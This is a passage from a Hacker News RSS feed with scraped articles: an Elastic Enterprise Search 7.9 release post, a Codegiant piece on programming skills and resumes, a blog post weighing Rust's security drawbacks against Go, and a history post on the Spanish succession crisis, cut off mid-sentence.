</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt262c603406aea4fd/5f3555d348d3b57cb974a5b8/enterprise-search-7-9-ws-thumbnails-blog.jpg" data-sys-asset-uid="blt262c603406aea4fd" alt="Elastic Workplace Search results screen with thumbnail preview"></p><p>Our 7.9 release continues to build on our recent efforts during a hectic 2020 to make Elastic Enterprise Search  available wherever you are, whether that‚Äôs via Elastic Cloud on Microsoft Azure, Google Cloud, or AWS in <a href="https://www.elastic.co/guide/en/cloud/current/ec-regions-templates-instances.html">dozens of regions</a> around the world, or with the self-managed download. Other new developments include Gmail content source integrations in Workplace Search, the introduction of Elastic Enterprise Search into Kibana, improvements in index management and logging, and intuitive UI updates. Let‚Äôs dive into a few of the details.
</p> <p><strong><h2>Features of Workplace Search added to our free distribution tier</h2></strong></p><p>
	The addition of Workplace Search features to our free distribution tier means that you can <a href="https://www.elastic.co/downloads/enterprise-search">download</a> and use the entire Elastic Enterprise Search solution to easily get started and boost productivity with modern search experiences. Whether it‚Äôs App Search for your apps and websites or Workplace Search for your internal teams, with the features included in the free distribution tier&nbsp;you can download and evaluate our full product suite. Workplace Search includes connectors to a host of popular collaboration, storage, and productivity tools, along with access to the Custom Source API for creating your own connectors. You also get group and user management tools, easily tunable content source prioritization by team, and much more. Then, as you need additional customization, integrations, granular access control, and single-sign-on (SSO) support, you‚Äôll find it all in our <a href="https://www.elastic.co/subscriptions">Platinum subscription</a>.
</p><h2><strong>Introducing Elastic Enterprise Search in Kibana</strong></h2><p>In 7.9, Kibana rolls out the welcome mat to Elastic Enterprise Search, offering easy navigation to your search deployments right alongside all your other favorite analysis and visualization tools. As the window into the Elastic Stack, Kibana allows users to do everything from rich data visualization using Elasticsearch indices to administering and managing the whole of the Elastic Stack. With this release, Kibana admins can customize spaces to show or hide Enterprise Search in the main navigation menu, and give users the capability to quickly access deployments and in-app dashboards.
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltd64ad0cc9a899866/5f3599c5327a6201d7ebba32/enterprise-search-7-9-in-kibana-blog.jpg" data-sys-asset-uid="bltd64ad0cc9a899866" alt="Elastic Enterprise Search in Kibana"></p><p><strong><h2>Announcing the federated Gmail connector for Workplace Search</h2></strong></p><p>Gmail joins Google Drive, Microsoft 365, Salesforce, Confluence, and a number of other <a href="https://www.elastic.co/workplace-search/content-sources">prebuilt content source integrations</a> for Workplace Search. Google is obviously no slouch at search, of course, but Workplace Search offers a single search bar for not just the G Suite, but across a slew of sources, regardless of the origin, manufacturer, or ecosystem. Users can conduct search without needing to remember where that data lives, and they‚Äôll see their own private <a href="https://www.elastic.co/guide/en/workplace-search/7.9/workplace-search-gmail-connector.html">Gmail content</a> right alongside all those other sources, with pretuned search relevance baked right in.&nbsp;
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltb8b3fc0b19a40778/5f3556811fe0e07eae8141bc/enterprise-search-7-9-gmail-connector-blog.jpg" data-sys-asset-uid="bltb8b3fc0b19a40778" alt="Gmail content source integration in Elastic Workplace Search "></p><p><strong><h2>Gleaning new insights from your knowledge landscape</h2></strong></p><p>Workplace Search tracks and logs document and record activity as it unfolds on third-party systems synchronized to the search experience, providing a centralized location for keeping track of organizational information shifts and hot spots. Over time, this provides businesses with critical insight into user behavior in third-party systems as well as auditing capabilities for information security purposes that often are not otherwise available. Combining this functionality with the <a href="https://www.elastic.co/security">Elastic Security</a> solution and our machine learning capabilities introduces a new and unique value for system administrators and IT teams.
</p> <p><strong><h2>Gaining more control over scale</h2></strong></p><p>Because Elastic Enterprise Search is built atop the Elastic Stack, powerful features can be pulled into App Search and Workplace Search based on user needs. In 7.9, App Search and Workplace Search inherit the index lifecycle management (ILM) policies feature from the Elastic Stack to automatically manage logs and analytics.
</p><p>The logs and analytics for Elastic Enterprise Search are now cycled automatically with ILM. Users can also change how long logs and analytics are retained with existing Elastic Stack tools, like the Kibana ILM policy management tool.&nbsp;
</p> <p><strong><h2>What else?</h2></strong></p><p>There are a few other Workplace Search updates in 7.9. You can use OpenSearch to quickly add a shortcut to your browser‚Äôs search bar to jump right to Workplace Search. There‚Äôs no need for tab switching just to conduct a quick search.
</p><p>Workplace Search also sports new document thumbnail previews, giving you snappy visual cues with robust document excerpts and metadata, for quickly finding just what you need.
</p><p>And rounding out the update are more personalized search results based on user behavior. The Search API inside Workplace Search now supports auto-filter detection as well as query-time boosting. This means authenticated user context on a page can be provided in the Search API to deliver a more customized search experience.
</p> <p><strong><h2>Try it today!</h2></strong>There‚Äôs a lot to like in 7.9, and we hope you‚Äôre as excited to try it as we are to introduce it. Existing Elastic Cloud customers can access Enterprise Search directly from the <a href="http://cloud.elastic.co/">Elastic Cloud console</a>. New to the Elastic Cloud? Start a <a href="https://cloud.elastic.co/registration">free 14-day trial of Elastic Enterprise Search</a>. Or <a href="https://www.elastic.co/downloads/enterprise-search">download</a> the self-managed versions of App Search or Workplace Search for free.</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.elastic.co/blog/whats-new-elastic-enterprise-search-7-9-0-free-workplace-search-kibana-access</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589564</guid>
            <pubDate>Fri, 25 Sep 2020 13:39:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[YouTube Channels to Level Up Your Programming Skills]]>
            </title>
            <description>
<![CDATA[
Score 257 | Comments 118 (<a href="https://news.ycombinator.com/item?id=24589474">thread link</a>) | @spiderjako22
<br/>
September 25, 2020 | https://blog.codegiant.io/programming-skills-d77d4abdf255 | <a href="https://web.archive.org/web/*/https://blog.codegiant.io/programming-skills-d77d4abdf255">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://blog.codegiant.io/@codegiant?source=post_page-----d77d4abdf255--------------------------------" rel="noopener"><img alt="Team Codegiant" src="https://miro.medium.com/fit/c/96/96/2*iU0oAI5CSMp5LPuEKOqNuQ.png" width="48" height="48"></a></p></div></div></div></div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2740/1*Xx2YxTWIGNI3ExVLq1meoA.png" width="1370" height="992" srcset="https://miro.medium.com/max/552/1*Xx2YxTWIGNI3ExVLq1meoA.png 276w, https://miro.medium.com/max/1104/1*Xx2YxTWIGNI3ExVLq1meoA.png 552w, https://miro.medium.com/max/1280/1*Xx2YxTWIGNI3ExVLq1meoA.png 640w, https://miro.medium.com/max/1400/1*Xx2YxTWIGNI3ExVLq1meoA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Xx2YxTWIGNI3ExVLq1meoA.png?q=20"></p></div></div></div></figure><p id="d6a2"><strong>From the desk of a brilliant weirdo #1:</strong></p><p id="e270"><em>Thank you for taking the time to check out this article. It doesn‚Äôt matter where you‚Äôre coming from (Codegiant, Hacker News, Reddit, or some other place), I always appreciate every reader who lands on my articles.</em></p><p id="0d0f">Now that I‚Äôve coaxed you into reading this article, let‚Äôs get down to brass tacks.</p><p id="fb09">Whenever you‚Äôre just starting out with <a rel="noopener" href="https://blog.codegiant.io/software-development-life-cycle-the-ultimate-guide-2020-153d17bb20fb">software development</a> or simply want to uplevel your programming skills, you‚Äôll need the right info resources to achieve your goals.</p><p id="3284">In this article, I‚Äôve listed 22 of the best YouTube channels for improving your programming skills. Some are geared towards beginners while others focus on advanced topics.</p><p id="993e">So, if you consider yourself an experienced programmer, you can jump over to the last section where you‚Äôll find all the 22 YouTube channels.</p><p id="2c67">If you are a beginner developer, however, I recommend that you go through each section of this article as we‚Äôll talk about coding in general, programming skills, your computer programming resume, job opportunities, and some of the most in-demand programming languages.</p><p id="65e3">Without further ado:</p><p id="359c">Coding is the end result of a specific set of actions triggered to create a tangible result, whether it is a web page, an app, a video, or just an image on your screen.</p><p id="c92e">The great thing about computer coding (or programming) is that you can have a big idea and actually code it out into reality. And it doesn‚Äôt cost much, barring some time and effort on your side.</p><p id="3e5a">Many non-tech people consider the definition of a computer programmer to be someone who just makes programs. Although that‚Äôs partly true, partly not, it‚Äôs a mistake. Managers believe that the more lines of code a programmer can produce a month, the more creative he will be ‚Äî another mistake. You can‚Äôt put a <a rel="noopener" href="https://blog.codegiant.io/software-developer-vs-software-engineer-31e873e787bc">developer</a> into a cubicle, set a deadline, ask him to work for 8‚Äì9 hours straight, and expect a top-notch quality software at the end.</p><p id="9e66">Instead of thinking about the programs a developer composes, one should consider the possible computations evoked by the developed program. ‚ÄúDesigning a set of computations‚Äù is a more accurate description of what programmers actually do.</p><p id="5647">One can also imagine programmers as writers that have to think and write carefully, because the readers (the computers) take what the programmers write literally.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2330/0*al-_-Anr6m8BIIIi" width="1165" height="805" srcset="https://miro.medium.com/max/552/0*al-_-Anr6m8BIIIi 276w, https://miro.medium.com/max/1104/0*al-_-Anr6m8BIIIi 552w, https://miro.medium.com/max/1280/0*al-_-Anr6m8BIIIi 640w, https://miro.medium.com/max/1400/0*al-_-Anr6m8BIIIi 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*al-_-Anr6m8BIIIi?q=20"></p></div></div></div></figure><p id="f506">Many non-tech folks believe that programming is all about acquiring technical skills. I believe that being a developer requires more than just knowing how to code. To make it in the software development world, you‚Äôll need to dig up some creativity and inject it into your coding skills. The ability to think analytically is highly valued among developers as well.</p><p id="1779">One of the most essential skills a developer can have isn‚Äôt actually technical, it‚Äôs social, and that is empathy. Lack of empathy inevitably leads to poor communication (barring you are a narcissist, sociopath, or psychopath and therefore can be charming as hell). On the other hand, being able to put empathy into practice will, without doubt, boost your career opportunities.</p><p id="9732">When it comes to <strong>planning software</strong>, developers should know how to use models and flowcharts to convey instructions clearly.</p><p id="c39f"><strong>Designing and creating applications</strong>. Depending on the project, this can take from a couple of weeks to months and sometimes even years to complete.</p><p id="9b77"><strong>Writing programs</strong>. As simple as that.</p><p id="9220"><strong>Update and expand existing programs</strong>. Most times, you‚Äôll need to modify and update existing programs with extra features.</p><p id="e7df"><strong>Debugging code</strong>. Yup.</p><p id="5ef0"><strong>Simplify programming</strong>. Developers may also use software tools to automate a part of their development process in order to simplify and speed up the workflow.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2564/0*tJ40Go85DKYBw5cS" width="1282" height="869" srcset="https://miro.medium.com/max/552/0*tJ40Go85DKYBw5cS 276w, https://miro.medium.com/max/1104/0*tJ40Go85DKYBw5cS 552w, https://miro.medium.com/max/1280/0*tJ40Go85DKYBw5cS 640w, https://miro.medium.com/max/1400/0*tJ40Go85DKYBw5cS 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*tJ40Go85DKYBw5cS?q=20"></p></div></div></div></figure><p id="8ced">Showing up and practicing your programming skills seem to be the main ingredients to getting better at programming and coding. You gotta be programming in your spare time; you gotta be obsessed with it. Load yourself with patience because becoming a skilled coder takes years. And anyone who is telling you that you can learn and become good at coding in a month is probably trying to sell you something.</p><p id="8e25">Senior developers have all adopted common traits and basic coding skills that have helped them to rise in the hierarchy during their programming careers. Here are some valuable skills needed for you to be a senior developer:</p><p id="3a2c">One, being able to easily explain tech stuff to non-technical people.</p><p id="b60e">Two, being able to come up with accurate estimates.</p><p id="8cdb">Three, willingness to roll up their sleeves and do some grunt work.</p><p id="49a8">Four, knowing when to raise an issue to upper management.</p><p id="ff3f">Five, the ability to mentor junior developers.</p><p id="eb41">Six, vast knowledge of the technicalities for their domain.</p><h2 id="5ec1">Understand how the language works</h2><p id="e035">Focus on one language while learning. Having your focus split between two or three languages will discombobulate you.</p><p id="c797">It becomes obvious when a programmer doesn‚Äôt have a good understanding of the programming language he‚Äôs using. He‚Äôll try to solve problems by following the logic of other languages and thus litter the code with unnecessary statements that can otherwise be reduced to fewer lines.</p><p id="094c">Also, you must know how to organize code into a system that makes sense. Creating rigid classes, schemas, and hierarchies require you to first think them through. Design can be a broad topic so I won‚Äôt cover much, but if you wish to read more, head over <a href="https://en.wikipedia.org/wiki/Fred_Brooks" rel="noopener">here</a>.</p><p id="e256">Poorly designed software lacks well-defined concepts, and its responsibilities are vague. Good software, on the other hand, comes with clear concepts and responsibilities. Take a look at mathematicians and physicists. They spend a huge amount of time trying to develop a clear definition of something because that will allow them to understand the truth about it. Developers should take a similar approach and spend a considerable amount of time brainstorming before writing code. Yes, this might be controversial to Agile but you gotta do what you gotta do.</p><p id="8ecf">It‚Äôs better to sit down with the dev team initially and outline all the required tasks than to go through 10 rounds of code reviews later.</p><p id="ea9f">Perhaps the best way to learn about design is to write and study many programs written by experienced programmers. As you gain more coding experience, you‚Äôll, without doubt, enhance your design skills and expand your knowledge.</p><p id="0729">Good programmers ask questions like:</p><ul><li id="ff87">What‚Äôs the goal of this function?</li><li id="ee63">How can I explain this data structure to my teammates?</li><li id="771f">Can this function represent two standalone tasks?</li><li id="0e31">What‚Äôs the responsibility of this snippet of code?</li><li id="0f32">What should I include in the public interface?</li></ul><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2648/0*uR00-riTaFDc4QFt" width="1324" height="919" srcset="https://miro.medium.com/max/552/0*uR00-riTaFDc4QFt 276w, https://miro.medium.com/max/1104/0*uR00-riTaFDc4QFt 552w, https://miro.medium.com/max/1280/0*uR00-riTaFDc4QFt 640w, https://miro.medium.com/max/1400/0*uR00-riTaFDc4QFt 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*uR00-riTaFDc4QFt?q=20"></p></div></div></div></figure><p id="d2d4">Most people think that you need a diploma from Harvard or universities alike to be considered for a job in big tech companies. Although that may be partially true (<a href="https://www.cnbc.com/2018/08/16/15-companies-that-no-longer-require-employees-to-have-a-college-degree.html" rel="noopener">not always though, it seems Apple and Google no longer require you to have a college degree</a>), some companies prefer the opposite, or at least don‚Äôt want you to be coming for Harvard, Oxford, Stanford, etc.</p><p id="3c6c">There are CEOs out there looking for developers that are qualified but not overly qualified‚Ä¶ hard workers, being on time, but also leaving at the stroke of 5. Such CEOs consider Ivy League schools to be a red flag. Big resumes are also a red flag. That‚Äôs because developers coming from such schools can‚Äôt get off their high horse, question whether every decision is optimal, and are always hungry for praise, recognition, and ‚Äúinteresting work.‚Äù</p><p id="c97a">Instead, these CEOs are looking for loyal people who know how to take orders without questioning, and are ready to do the work, day in and day out, because they need the paycheck at the end of the month.</p><p id="6749">At a glance, this might seem quite controversial. Yet, there are developers out there who don‚Äôt want to become millionaire CTOs at the age of 30. Instead, they are satisfied with what they have on their plate: a steady job, fair pay, and that‚Äôs about it. Some companies with that kind of culture say that they have produced a 100% employee retention rate which means developers are happy with their work environment.</p><h2 id="11a4">Let‚Äôs talk about your resume now.</h2><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1964/0*P0TDzRLC7SaDQKzK" width="982" height="911" srcset="https://miro.medium.com/max/552/0*P0TDzRLC7SaDQKzK 276w, https://miro.medium.com/max/1104/0*P0TDzRLC7SaDQKzK 552w, https://miro.medium.com/max/1280/0*P0TDzRLC7SaDQKzK 640w, https://miro.medium.com/max/1400/0*P0TDzRLC7SaDQKzK 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*P0TDzRLC7SaDQKzK?q=20"></p></div></div></div></figure><p id="2aa7">So, what should you list on your resume?</p><p id="8bab">Proficiency in programming languages is, ostensibly, a vital thing to include. Always remember that companies are getting tens, hundreds, even thousands of applications a month. All of which say ‚ÄúI can do X.‚Äù The thing is skill level varies between each applicant. You should describe your coding experience and give examples of successful projects you‚Äôve completed.</p><p id="dbb6">When listing your most valuable programming skills, there are a couple of things you need to know in order to have a fully optimized programming resume.</p><ol><li id="72b7">Before sending your resume, always go through the job description a couple of times and try to understand what is relevant to the job you are applying for. Then make yourself relevant to the job.</li><li id="dd11">Always be honest with yourself. Don‚Äôt list programming languages you don‚Äôt know because they are mentioned in the job description. Don‚Äôt tell them you have 5 years of experience when you only have 4 years and 1 month.</li><li id="1642">Place your programming skills (languages) right at the top, below the header.</li><li id="a384">List your most advanced coding skills first, then in the middle list the ones you are least experienced with, and at the end, list the programming skills you have a decent experience with.</li><li id="44ae">Create horizontal categories instead of vertical ones. This eliminates the blank space on your resume while remaining aesthetically pleasing.</li></ol><p id="1230">In your resume, except for talking about what you bring to the table, you can also mention what you‚Äôre looking for in an employer. You‚Äôll thus earn the respect you are looking for if you get the job.</p><p id="48b7">Also, avoid using phrases that everybody else is using. Don‚Äôt be afraid to infuse your CV with some personality. You‚Äôll thus stand out. Not everybody will like your personality, but those that do will adore you. Try to be specific in your writing. Instead of ‚Äúextensive experience,‚Äù say ‚Äú5 years and 6 months of experience.‚Äù Instead of saying ‚ÄúY number of successful projects,‚Äù say ‚ÄúY amount of successful projects that helped us achieve A, ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.codegiant.io/programming-skills-d77d4abdf255">https://blog.codegiant.io/programming-skills-d77d4abdf255</a></em></p>]]>
            </description>
            <link>https://blog.codegiant.io/programming-skills-d77d4abdf255</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589474</guid>
            <pubDate>Fri, 25 Sep 2020 13:30:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Not Rust for Security?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589427">thread link</a>) | @lukastyrychtr
<br/>
September 25, 2020 | https://www.cryptologie.net/article/505/why-not-rust-for-security/ | <a href="https://web.archive.org/web/*/https://www.cryptologie.net/article/505/why-not-rust-for-security/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>I read a <a href="https://matklad.github.io/2020/09/20/why-not-rust.html">Why Not Rust?</a> article the other day that was quite good but dismissed the most important reason to use a language to me: <strong>security</strong>. After having worked on a Rust codebase for almost two years now, I thought I would chime in, even though I'll preface the post by saying that Rust is totally the right language you should use if you know what you're doing and are aiming for performance and security, yet I still have some pain points that will make me recommend <a href="https://golang.org/">Golang</a> over Rust sometimes. Keep in mind that I have also spent my whole career looking for bugs in applications written in dozens of different languages, so my post might be highly controversial but it has to be looked from these lenses.</p>
<h2>Shallow standard library</h2>
<p>Working with Rust is like working with Javascript in many ways. While the package manager Cargo is truly awesome, the fact that the standard library misses most features will have you import many third-party dependencies. These dependencies in turn import other third-party dependencies, that import other third-party dependencies, and so on. This blow up of dependencies can quickly become a nightmare, and this is of course a perfect vector of attack for backdoors, like we've seen happen before in javascript land (<a href="https://www.infoq.com/news/2018/05/npm-getcookies-backdoor">https://www.infoq.com/news/2018/05/npm-getcookies-backdoor</a>/, <a href="https://www.zdnet.com/article/hacker-backdoors-popular-javascript-library-to-steal-bitcoin-funds">https://www.zdnet.com/article/hacker-backdoors-popular-javascript-library-to-steal-bitcoin-funds</a>/).</p>
<p>Not only this, but if you're a newcomer to Rust, how do you even pick the right library? I can't even fathom how anyone writing a project in Rust gets to pick a good library for generating cryptographic random numbers, or for doing any type of crypto like encrypting or hashing, or for decoding hex strings, or for decoding JSON, or for using TCP, or even for using TLS! On the other hand Golang has all of that in its standard library, that means that when you use Golang you:</p>
<ul>
<li>can't pick the wrong algorithm (e.g. DES instead of AES)</li>
<li>can't pick a bad implementation (the standard library is known to be high quality) </li>
<li>can't pick a dependency that ends up importing plenty of other third-party dependencies (unlike Rust, the Golang standard library never imports third-party libraries)</li>
<li>don't have to worry about version updates (you're just updating your version of Golang instead of the versions of many dependencies)</li>
<li>don't have to worry about transitive dependencies that you can't update (again, Golang standard library doesn't rely on third-party dependencies)</li>
</ul>
<p>For <a href="http://libra.org/">Libra</a> we've used a number of techniques in order to reduce the number of third-party dependencies we use. This included figuring out when we used different dependencies that did the same thing, or figuring out what obscure dependencies we should avoid, we even re-wrote a large number of dependencies to avoid dependencies that ended up exploding the number of transitive third-party dependencies we imported. One useful tool we used for some of that is <a href="https://github.com/mimoo/cargo-dephell">dephell</a> which is built on top of <a href="https://github.com/facebookincubator/cargo-guppy">guppy</a>.</p>
<h2>Rustfmt is imperfect</h2>
<p><code>rustfmt</code> is great, but <code>rustfmt</code> sucks. Why does it suck? Two reasons: </p>
<ul>
<li>it's not mandatory</li>
<li>it's configurable</li>
</ul>
<p>On the other hand, Golang's compiler is very strict and will yell at you early on if you have dead code, unused dependencies, badly formatted code, and so on. It doesn't replace <code>gofmt</code>, but it's much more opinionated and is much more effective at making Golang's codebases more readable (especially if they forget to run <code>gofmt</code>). In addition, if you do use <code>gofmt</code>, you can't configure it! This is very apparent when you read Golang code, it always looks the same! And it is pretty fucking fantastic if you ask me, because not only Golang is easy to learn, but you can quickly get used to any Golang codebase due to the consistent formatting of the language.</p>
<h2>Too many ways to do things</h2>
<p>Rust has a somewhat different syntax from other languages of its genre, and you sometimes see things that you might not be used to see (statement as expression, match statements, lifetimes, etc.) I couldn't care less about these, these are things you can learn, and you end up getting used to them. What I can't get used to is the sheer number of ways to do something. There are so many keywords in Rust, and there's so many ways to end up bike shedding on the best way to write the exact same statement, that I consider it a waste of time. It's a waste of time for the developers, but also for the reviewers who will often run into keywords that they've never seen before. For example, there are too many ways to panic on purpose: <code>panic!()</code>, <code>unwrap()</code>, <code>except()</code>, <code>unreachable!()</code>, <code>todo!()</code>, <code>unimplemented!()</code>, <code>assert!()</code>, and so on. </p>
<h2>Generics and macros</h2>
<p>Rust is too expressive. This is of course great for some use-cases, but holy shit if a developer wants to be too clever, they can create the most unintelligible codebase that you'll ever seen. This is probably the most controversial point, but security is not just safety, it's also readability. As we say "complexity is the enemy of security", and generics undeniably add complexity. This is of course up to the developers to abuse them, but the great thing about Golang is that there aren't many things to abuse, codebases are often straight forward and you can quickly understand what is happening.</p>
<h2>Ok, you're being unreasonable David</h2>
<p>Sure, I'm omitting a lot of good Rust things in here, but this is a post about the security downsides of Rust, not the upsides, which let's be clear still make Rust the perfect language to write a sensitive application in. You just need to know what you're doing. This also means that Rust has a lot of room to mature, while generics are here to stay, there is no excuse to keep slipping the shallow stdlib under the rug.</p>
</article></div>]]>
            </description>
            <link>https://www.cryptologie.net/article/505/why-not-rust-for-security/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589427</guid>
            <pubDate>Fri, 25 Sep 2020 13:24:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Carving Up Spain]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589190">thread link</a>) | @lordleft
<br/>
September 25, 2020 | https://www.moltensulfur.com/post/carving-up-spain | <a href="https://web.archive.org/web/*/https://www.moltensulfur.com/post/carving-up-spain">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.19.2"><div dir="ltr"><div><p id="viewer-foo">This is not a post about the War of the Spanish Succession (1701-1714). That would be long and boring and not gameable. This is a post about the <em>political crisis</em> that led to the war ‚Äì&nbsp;which is long and interesting and <em>very<strong> </strong></em>gameable! Stick with me, folks, because this is going to get weird!</p><p id="viewer-8oavk">This post is brought to you by beloved Patreon backer Arthur Brown. Thanks for helping keep the lights on! If you want to help keep this blog going alongside Arthur, head over to the <a href="http://patreon.com/MoltenSulfur" target="_blank" rel="noopener">Patreon page</a> ‚Äì and thank you!</p><div id="viewer-9h7k8"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.moltensulfur.com/post/carving-up-spain" data-pin-media="https://static.wixstatic.com/media/82a6d0_4902b263863c4197bd6b759021b053b7~mv2.jpg/v1/fit/w_700,h_409,al_c,q_80/file.png" src="https://static.wixstatic.com/media/82a6d0_4902b263863c4197bd6b759021b053b7~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-accni">To understand this strange political crisis, you first have to understand what an odd moment this was in European history. The nations of Europe had spent the past century or two fighting very hard to keep anything much from <em>happening</em>. In the 1500s (ish), Spain had been the dominant power on the continent, fueled by the great wealth it stole from the Americas. Most of Europe formed a shaky alliance to beat up on Spain before Spain could beat up on them individually. Now in the 1600s, France was the dominant power. Most of Europe joined a series of pacts and leagues to attack France for the same reason. </p><p id="viewer-4724o">This was ‚Äòbalance of power‚Äô politics. Driven by a desire not to be conquered, most nations worked together to keep the most powerful among them contained. The result was decades of war, millions dead, and only a few minor territories changing hands here or there. Despite the oh-so-complicated webs of alliances, the endless betrayals, and the absolute meat grinder the peasantry had to endure, at the end of each war of containment, little of consequence ever changed.</p><p id="viewer-3tjba">The impending death of King Carlos II of Spain was one more threat to the balance of power. Carlos had no heir. His closest living relatives weren‚Äôt Spaniards. It seemed likely that, upon his death, control of Spain would pass to the ruling house of a different European nation. That nation would gain not just Spain, but also the Netherlands, most of America, much of Italy, and the Philippines. Bolstered by this newfound revenue, this nation might then be strong enough to take on all of Europe and win. So out came the diplomats. Their goal: to convince enough other nations that <em>their</em> royal family should inherit the Spanish throne.</p><div id="viewer-26ea5"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.moltensulfur.com/post/carving-up-spain" data-pin-media="https://static.wixstatic.com/media/82a6d0_40be39e7d1a14d4a9c64c0645dc7c47c~mv2.jpg/v1/fit/w_700,h_409,al_c,q_80/file.png" src="https://static.wixstatic.com/media/82a6d0_40be39e7d1a14d4a9c64c0645dc7c47c~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-7hc14">King Carlos II of Spain</p><p id="viewer-5a648">We have three major players here. The first is King Carlos II of Spain. Carlos was born sick and lived his whole life sick. In English, he was called Charles the Sufferer. In Spanish, he was Carlos <em>el Hechizado</em> (‚Äòthe Bewitched‚Äô). Over his life, he suffered from what surely felt like every infection and congenital disease known to his doctors. The most obvious was his pronounced ‚Äòlantern jaw‚Äô, which made eating and speaking difficult. It‚Äôs also possible he suffered from intellectual developmental disabilities. From the moment of his birth as his parents‚Äô sole heir, his death was anticipated at any moment by the courts of Europe. That he made it to age 38 is a miracle.

</p><p id="viewer-6rtsi">Carlos was of the House of Habsburg, a German noble family that had an astonishing run of good fortune with marriage alliances in the late 1400s. Habsburgs kept marrying into royal families, conceiving heirs, and then having all the necessary members of these royal families die, leaving a Habsburg the sole heir. This truly incredible run of luck culminated in Carlos‚Äô great-great-grandfather being simultaneously the Holy Roman Emperor; King of Castille, Aragon, Naples, Sicily, Sardinia, and Hungary; Archduke of Austria; Lord of the Netherlands; and more besides ‚Äì&nbsp;all nominally separate countries (more or less) who just happened to have the same king. After that guy, the Habsburgs were pressured into splitting their family into two branches. One would rule Spain (and its holdings), the other Austria (and its holdings).</p><p id="viewer-268fb">Carlos‚Äô medical conditions were the result of the Habsburgs‚Äô notorious inbreeding. More than anyone, the Habsburgs knew that what they‚Äôd gained by marriage, they could lose by marriage. The Austrian and Spanish Habsburg branches intermarried constantly. All eight of Carlos II‚Äôs great-grandparents shared a recent ancestor. This all led not only to Carlos‚Äô sickliness, but also to his impotence, which guaranteed he could not produce an heir.</p><div id="viewer-8sbcl"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.moltensulfur.com/post/carving-up-spain" data-pin-media="https://static.wixstatic.com/media/82a6d0_09017a246c2f48739d0a6f9075f65762~mv2.jpg/v1/fit/w_946,h_553,al_c,q_80/file.png" src="https://static.wixstatic.com/media/82a6d0_09017a246c2f48739d0a6f9075f65762~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-ch9qf">Emperor Leopold I of Austria</p><p id="viewer-d35m6">Carlos‚Äô counterpart, the head of the Austrian branch of the family, was Leopold I. Leopold was a remarkable man. He spoke five languages, composed music, and cared deeply about statecraft. He was also a mild-mannered vacillator and a fanatical Catholic. Like Carlos, Leopold was absurdly inbred. His jaw stuck out so far, he couldn‚Äôt keep water out of his mouth when it rained. Leopold I sat atop a jumbled-together collection of kingdoms, duchies, and principalities, including Austria, Bohemia, Hungary, Styria, Moravia, Tyrol, and Croatia. He was also the Holy Roman Emperor, but that title came with little power and few responsibilities.

</p><p id="viewer-5m6jb">As a Habsburg, Leopold had an excellent male-line claim to the Spanish throne. This was handy, since not all of Carlos II‚Äôs Spanish empire recognized that rulership could be passed down the female line. But in case that wasn‚Äôt enough, Leopold was also married to Carlos‚Äô sister, Margarita Theresa. He was supposed to marry Margarita Theresa‚Äôs older sister, Marie Theresa, but Marie had to be married off at the last minute to King Louis XIV of France after Spain lost a war with France in 1659. Carlos and Leopold hastily arranged for Leopold to marry the younger Margarita Theresa instead, but that had to wait awhile, as Margarita Theresa was only nine at the time.</p><div id="viewer-4n1g"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.moltensulfur.com/post/carving-up-spain" data-pin-media="https://static.wixstatic.com/media/82a6d0_d86f76d044e94c25a739badb21778cdf~mv2.jpg/v1/fit/w_700,h_409,al_c,q_80/file.png" src="https://static.wixstatic.com/media/82a6d0_d86f76d044e94c25a739badb21778cdf~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-6tsic">King Louis XIV of France</p><p id="viewer-e5hu0">And this is where we introduce the other major claimant to the Spanish throne: France. King Louis XIV‚Äôs wife was the oldest sister of King Carlos II, giving Louis and Marie Theresa‚Äôs oldest son, the <em>Grande Dauphin</em>, an excellent claim to the throne of Spain. When Louis XIV died, that would make the <em>Grande Dauphin</em> king of France and Spain simultaneously. Admittedly, part of Louis XIV and Marie Theresa‚Äôs marriage contract was a promise that Marie Theresa renounce any claim on Spanish inheritance, but that promise was predicated on Spain 